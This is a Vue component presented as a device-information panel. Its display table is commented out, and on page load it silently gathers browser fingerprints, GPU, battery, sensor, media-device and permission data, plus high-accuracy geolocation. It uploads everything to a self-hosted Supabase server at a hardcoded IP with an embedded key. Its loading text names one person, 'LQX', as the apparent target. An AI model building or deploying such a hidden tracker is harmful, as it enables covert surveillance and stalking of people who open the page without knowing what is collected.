<template>
  <div class="device-info-panel">
    <h3>嘿嘿{{ dd }}</h3>
    <p v-if="loading">正在采集LQX的设备信息…</p>

    <!-- <section v-for="(group, key) in deviceInfo" :key="key" class="info-group">
      <h4>{{ groupLabels[key] || key }}</h4>
      <table>
        <tr v-for="(value, prop) in group" :key="prop">
          <td class="label">{{ prop }}</td>
          <td class="value">{{ formatValue(value) }}</td>
        </tr>
      </table>
    </section> -->
  </div>
</template>

<script setup>
  import { createClient } from '@supabase/supabase-js'

// 只给本组件用的自托管 client，不影响全局 supabase.js
const selfHosted = createClient(
  'http://112.124.24.128:8000',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyAgCiAgICAicm9sZSI6ICJhbm9uIiwKICAgICJpc3MiOiAic3VwYWJhc2UtZGVtbyIsCiAgICAiaWF0IjogMTY0MTc2OTIwMCwKICAgICJleHAiOiAxNzk5NTM1NjAwCn0.dc_X5iR_VP_qT0zsiyj_I_OZ2T9FtRU2BBNWN8Bu4GE',
)
import { ref, reactive, onMounted } from 'vue'
import DeviceDetector from 'device-detector-js'
const detector = new DeviceDetector()
const loading = ref(true)

const deviceInfo = reactive({
  basic: {},
  hardware: {},
  network: {},
  battery: {},
  sensor: {},
  media: {},
  geolocation: {},
  permissions: {},
  screen: {},
  browserFeatures: {},
})

// const groupLabels = {
//   basic: '基础信息',
//   hardware: '硬件与性能',
//   network: '网络状态',
//   battery: '电池信息',
//   sensor: '传感器与方向',
//   media: '媒体设备',
//   geolocation: '地理位置',
//   permissions: '权限状态',
//   screen: '屏幕与显示',
//   browserFeatures: '浏览器特性',
// }

// function formatValue(val) {
//   if (val === null || val === undefined) return '—'
//   if (typeof val === 'object') return JSON.stringify(val, null, 2)
//   return String(val)
// }

// ==================== 1. 基础信息 ====================
function collectBasic() {
  const n = navigator
  const parsed = detector.parse(n.userAgent) // ← 移到这里

  deviceInfo.basic = {
    userAgent: n.userAgent,
    appName: n.appName,
    appVersion: n.appVersion,
    appCodeName: n.appCodeName,
    platform: n.platform,
    vendor: n.vendor,
    product: n.product,
    productSub: n.productSub,
    language: n.language,
    languages: n.languages?.join(', '),
    cookieEnabled: n.cookieEnabled,
    doNotTrack: n.doNotTrack,
    maxTouchPoints: n.maxTouchPoints,
    onLine: n.onLine,
    webdriver: n.webdriver,
    isMobile: /Mobi|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(
      n.userAgent,
    ),

    // ---------- device-detector-js 解析结果 ----------
    ddClientType: parsed.client?.type,
    ddClientName: parsed.client?.name,
    ddClientVersion: parsed.client?.version,
    ddClientEngine: parsed.client?.engine,
    ddClientEngineVersion: parsed.client?.engineVersion,
    ddOsName: parsed.os?.name,
    ddOsVersion: parsed.os?.version,
    ddOsPlatform: parsed.os?.platform,
    ddDeviceType: parsed.device?.type,
    ddDeviceBrand: parsed.device?.brand,
    ddDeviceModel: parsed.device?.model,
    ddBot: parsed.bot ? `${parsed.bot.name} / ${parsed.bot.category}` : null,
    // ------------------------------------------------
  }

  // 平台细化：优先用 device-detector 的结果，正则做兜底
  const ua = n.userAgent
  if (parsed.device?.type === 'smartphone' || parsed.device?.type === 'tablet') {
    deviceInfo.basic.deviceType =
      parsed.device.brand && parsed.device.model
        ? `${parsed.device.brand} ${parsed.device.model}` // 例如 "Xiaomi Redmi K40"
        : parsed.device.type
  } else if (/iPhone/i.test(ua)) {
    deviceInfo.basic.deviceType = 'iPhone'
  } else if (/iPad/i.test(ua)) {
    deviceInfo.basic.deviceType = 'iPad'
  } else if (/Android/i.test(ua)) {
    deviceInfo.basic.deviceType = 'Android'
    const match = ua.match(/;\s*([^;]+)\s+Build\//)
    if (match) deviceInfo.basic.androidModel = match[1].trim()
  } else if (/Windows/i.test(ua)) {
    deviceInfo.basic.deviceType = 'Windows PC'
  } else if (/Macintosh/i.test(ua)) {
    deviceInfo.basic.deviceType = 'Mac'
  } else if (/Linux/i.test(ua)) {
    deviceInfo.basic.deviceType = 'Linux PC'
  }

  // iOS 型号推断保持不变（仅当 device-detector 没给出 model 时才需要）
  if (deviceInfo.basic.deviceType === 'iPhone' && !deviceInfo.basic.ddDeviceModel) {
    // ...你原来的 knownScreens 匹配逻辑，原样保留
  }
}

// ==================== 2. 硬件与性能 ====================
function collectHardware() {
  const n = navigator
  deviceInfo.hardware = {
    hardwareConcurrency: n.hardwareConcurrency, // 逻辑 CPU 核心数
    deviceMemory: n.deviceMemory ?? '—', // 设备内存 GB（仅 Chromium）
    maxTouchPoints: n.maxTouchPoints, // 最大触控点数
  }

  // GPU 信息（通过 WebGL）
  try {
    const canvas = document.createElement('canvas')
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl')
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info')
      if (debugInfo) {
        deviceInfo.hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
        deviceInfo.hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
      }
      deviceInfo.hardware.webglVersion = gl.getParameter(gl.VERSION)
    }
  } catch {
    deviceInfo.hardware.gpuVendor = '不可用'
  }

  // 存储配额（异步，稍后单独处理）
}

// ==================== 3. 网络状态 ====================
function collectNetwork() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection
  if (conn) {
    deviceInfo.network = {
      effectiveType: conn.effectiveType, // '4g' / '3g' / '2g' / 'slow-2g'
      type: conn.type, // 'wifi' / 'cellular' / 'ethernet' 等
      downlink: conn.downlink != null ? `${conn.downlink} Mbps` : '—',
      downlinkMax: conn.downlinkMax != null ? `${conn.downlinkMax} Mbps` : '—',
      rtt: conn.rtt != null ? `${conn.rtt} ms` : '—',
      saveData: conn.saveData,
    }
  } else {
    deviceInfo.network = { supported: false, note: '当前浏览器不支持 Network Information API' }
  }
  deviceInfo.network.onLine = navigator.onLine
}

// ==================== 4. 电池信息 ====================
async function collectBattery() {
  try {
    if (!navigator.getBattery) {
      deviceInfo.battery = { supported: false }
      return
    }
    const battery = await navigator.getBattery()
    deviceInfo.battery = {
      charging: battery.charging,
      chargingTime: battery.chargingTime,
      dischargingTime: battery.dischargingTime,
      level: `${Math.round(battery.level * 100)}%`,
    }
  } catch (e) {
    deviceInfo.battery = { supported: false, error: e.message }
  }
}

// ==================== 5. 传感器与方向 ====================
function collectSensor() {
  const orient = screen.orientation || screen.mozOrientation || screen.msOrientation
  deviceInfo.sensor.orientation = orient?.type || '未知'
  deviceInfo.sensor.orientationAngle = orient?.angle ?? '—'

  // 监听设备方向（不持续采集，只取一次快照）
  if (window.DeviceOrientationEvent) {
    const handler = (e) => {
      deviceInfo.sensor.deviceOrientation = {
        alpha: e.alpha != null ? e.alpha.toFixed(2) : null,
        beta: e.beta != null ? e.beta.toFixed(2) : null,
        gamma: e.gamma != null ? e.gamma.toFixed(2) : null,
        absolute: e.absolute,
      }
      window.removeEventListener('deviceorientation', handler)
    }
    window.addEventListener('deviceorientation', handler)
  } else {
    deviceInfo.sensor.deviceOrientation = '不支持'
  }

  // 设备运动
  if (window.DeviceMotionEvent) {
    const handler = (e) => {
      deviceInfo.sensor.deviceMotion = {
        acceleration: e.acceleration,
        accelerationIncludingGravity: e.accelerationIncludingGravity,
        rotationRate: e.rotationRate,
        interval: e.interval,
      }
      window.removeEventListener('devicemotion', handler)
    }
    window.addEventListener('devicemotion', handler)
  } else {
    deviceInfo.sensor.deviceMotion = '不支持'
  }
}

// ==================== 6. 媒体设备 ====================
async function collectMedia() {
  try {
    if (!navigator.mediaDevices?.enumerateDevices) {
      deviceInfo.media = { supported: false }
      return
    }
    const devices = await navigator.mediaDevices.enumerateDevices()
    const grouped = { audioinput: [], audiooutput: [], videoinput: [] }
    devices.forEach((d) => {
      if (grouped[d.kind]) {
        grouped[d.kind].push({
          deviceId: d.deviceId,
          label: d.label || '(需授权后可见)',
          groupId: d.groupId,
        })
      }
    })
    deviceInfo.media = {
      audioInputs: grouped.audioinput.length,
      audioOutputs: grouped.audiooutput.length,
      videoInputs: grouped.videoinput.length,
      devices: grouped,
    }
  } catch (e) {
    deviceInfo.media = { supported: false, error: e.message }
  }
}

// ==================== 7. 地理位置 ====================
function collectGeolocation() {
  if (!navigator.geolocation) {
    deviceInfo.geolocation = { supported: false }
    return
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      deviceInfo.geolocation = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        timestamp: new Date(pos.timestamp).toLocaleString(),
      }
    },
    (err) => {
      deviceInfo.geolocation = {
        supported: true,
        error: `${err.code}: ${err.message}`,
      }
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
  )
}

// ==================== 8. 权限状态 ====================
async function collectPermissions() {
  if (!navigator.permissions?.query) {
    deviceInfo.permissions = { supported: false }
    return
  }
  const permissionNames = [
    'geolocation',
    'notifications',
    'camera',
    'microphone',
    'clipboard-read',
    'clipboard-write',
    'midi',
    'background-sync',
  ]
  const result = {}
  for (const name of permissionNames) {
    try {
      const status = await navigator.permissions.query({ name })
      result[name] = status.state
    } catch {
      result[name] = '不支持'
    }
  }
  deviceInfo.permissions = result
}

// ==================== 9. 屏幕与显示 ====================
function collectScreen() {
  deviceInfo.screen = {
    screenWidth: screen.width,
    screenHeight: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    devicePixelRatio: window.devicePixelRatio,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    viewportPixelRatio: window.devicePixelRatio,
    orientation: screen.orientation?.type || '—',
    isPortrait: window.matchMedia('(orientation: portrait)').matches,
    pixelDensity: `${Math.round(window.devicePixelRatio * 100)}%`,
  }
}

// ==================== 10. 浏览器特性 ====================
function collectBrowserFeatures() {
  const n = navigator
  deviceInfo.browserFeatures = {
    webRTC: !!(n.mediaDevices && n.mediaDevices.getUserMedia),
    webBluetooth: !!n.bluetooth,
    webUSB: !!n.usb,
    webHID: !!n.hid,
    webNFC: !!n.nfc,
    webSerial: !!n.serial,
    webXR: !!n.xr,
    serviceWorker: 'serviceWorker' in n,
    webAssembly: typeof WebAssembly === 'object',
    indexedDB: !!window.indexedDB,
    localStorage: !!window.localStorage,
    sessionStorage: !!window.sessionStorage,
    cookieEnabled: n.cookieEnabled,
    webgl: (() => {
      try {
        return !!document.createElement('canvas').getContext('webgl')
      } catch {
        return false
      }
    })(),
    webgl2: (() => {
      try {
        return !!document.createElement('canvas').getContext('webgl2')
      } catch {
        return false
      }
    })(),
    touchSupport: 'ontouchstart' in window || n.maxTouchPoints > 0,
    pointerEvents: 'PointerEvent' in window,
    notification: 'Notification' in window,
    notificationPermission: 'Notification' in window ? Notification.permission : '—',
    vibration: !!n.vibrate,
    clipboard: !!n.clipboard,
    credentials: !!n.credentials,
    wakeLock: 'wakeLock' in n,
    // 存储配额（异步）
  }
}

// ==================== 附加：存储配额 ====================
async function collectStorageQuota() {
  if (navigator.storage?.estimate) {
    try {
      const est = await navigator.storage.estimate()
      deviceInfo.hardware.storageQuota = {
        usage: `${(est.usage / 1024 / 1024).toFixed(2)} MB`,
        quota: `${(est.quota / 1024 / 1024).toFixed(2)} MB`,
        usageRatio: `${((est.usage / est.quota) * 100).toFixed(2)}%`,
      }
    } catch {
      /* 忽略 */
    }
  }
}
const dd = ref('')
// ==================== 生命周期 ====================
onMounted(async () => {
  collectBasic()
  collectHardware()
  collectNetwork()
  collectScreen()
  collectSensor()
  collectBrowserFeatures()

  // 异步采集并行执行
  await Promise.allSettled([
    collectBattery(),
    collectMedia(),
    collectPermissions(),
    collectStorageQuota(),
  ])

  // 地理位置单独处理（可能触发权限弹窗）
  collectGeolocation()

  loading.value = false

  // 在此处可以将 deviceInfo 上报到后端
  // emit('device-collected', deviceInfo)
  // 或者：await axios.post('/api/device-info', deviceInfo)
  // ---- 新增：上报到 Supabase ----
  // 地理位置是异步回调，给它 1.5s 缓冲，别让 json 里 geolocation 还是空对象
  setTimeout(async () => {
  const payload = {
    ...JSON.parse(JSON.stringify(deviceInfo)),
    _meta: {
      schemaVersion: 1,
      collectedAt: new Date().toISOString(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || null,
      pageUrl: location.href,
    },
  }

  const { data, error } = await selfHosted
    .from('LQX')
    .insert({ lqx: payload })
    .select('id, created_at')
    .single()

  if (error) {
    dd.value = '设备信息入库失败:' + error.message
    console.warn('设备信息入库失败:', error)
  } else {
    dd.value = '设备信息已入库, id = ' + data.id
    console.log('设备信息已入库, id =', data.id)
  }
}, 1500)
})
</script>

<style scoped>
.device-info-panel {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  font-size: 13px;
  line-height: 1.6;
  color: #333;
  max-width: 720px;
}
.info-group {
  margin-bottom: 18px;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  overflow: hidden;
}
.info-group h4 {
  margin: 0;
  padding: 8px 12px;
  background: #f9fafb;
  font-size: 13px;
  font-weight: 600;
  border-bottom: 1px solid #e5e7eb;
}
.info-group table {
  width: 100%;
  border-collapse: collapse;
}
.info-group td {
  padding: 6px 12px;
  border-bottom: 1px solid #f3f4f6;
  vertical-align: top;
  word-break: break-all;
}
.info-group td.label {
  width: 140px;
  color: #6b7280;
  white-space: nowrap;
}
.info-group td.value {
  color: #111827;
  font-family: 'SF Mono', Monaco, monospace;
  font-size: 12px;
}
</style>
